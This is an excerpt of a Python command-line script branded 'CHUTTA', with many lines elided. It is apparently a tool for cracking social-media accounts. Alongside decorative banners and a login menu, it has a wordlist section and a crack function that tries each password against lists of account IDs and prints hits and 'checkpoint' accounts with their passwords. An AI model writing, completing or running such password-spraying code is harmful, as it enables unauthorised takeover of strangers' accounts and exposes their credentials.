...
os.system('clear')
banner()
os.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_CHUTTA_WORLD.mp3")
...
def login_lagi():
	try:
		...
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ LOGIN SUCCESSFUL \n \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ TYPE \x1b[1;96mpython CHUTTA.py');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m CONTACT ME')
...
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     Example: /sdcard/CHUTTA.txt     \033[40m\033[00m')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mCHUTTA\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [CHUTTA] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;93m[CHUTTA-CP] {idf} | {pw}{N}')     
